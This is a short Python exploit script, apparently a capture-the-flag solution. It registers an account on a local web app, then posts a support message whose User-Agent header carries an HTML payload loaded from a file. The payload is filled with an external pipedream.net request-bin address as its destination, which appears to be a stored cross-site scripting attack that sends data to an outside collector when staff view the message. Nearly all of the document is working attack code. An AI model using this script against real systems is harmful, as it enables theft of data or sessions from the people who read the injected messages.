import requests
import argparse
import os


def make_email():
    return os.urandom(12).hex() + '@example.dev'


def register_account(session, server):
    resp = session.post(server + '/register', data={
        'email': make_email(),
        'password': 'foofoo',
        'password2': 'foofoo'})
    resp.raise_for_status()


def get_support(session, server):
    resp = session.get(server + '/support')
    resp.raise_for_status()
    return resp.url


def post_support_message(session, support_url, payload):
    # first sso
    resp = session.get(support_url + '/message')
    resp.raise_for_status()
    msg = "auto-solution-test"
    pow_value = "c8157e80ff474182f6ece337effe4962"
    data = {"message": msg, "pow": pow_value}
    resp = session.post(support_url + '/message', data=data,
            headers={'User-Agent': payload})
    resp.raise_for_status()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--requestbin',
            default='https://eo3krwoqalopeel.m.pipedream.net')
    parser.add_argument('server', default='http://localhost:3123/',
            nargs='?', help='TODO Server')
    args = parser.parse_args()

    server = args.server
    if server.endswith('/'):
        server = server[:-1]
    sess = requests.Session()
    register_account(sess, server)
    support_url = get_support(sess, server)
    if support_url.endswith('/'):
        support_url = support_url[:-1]
    print('Support URL: ', support_url)
    payload = open('payload.html').read().replace('\n', ' ')
    payload = payload.replace('{{dest}}', args.requestbin
            ).replace('{{ep}}', server)
    print('Payload is: ', payload)
    post_support_message(sess, support_url, payload)
    print('Sent support message.')


if __name__ == '__main__':
    main()
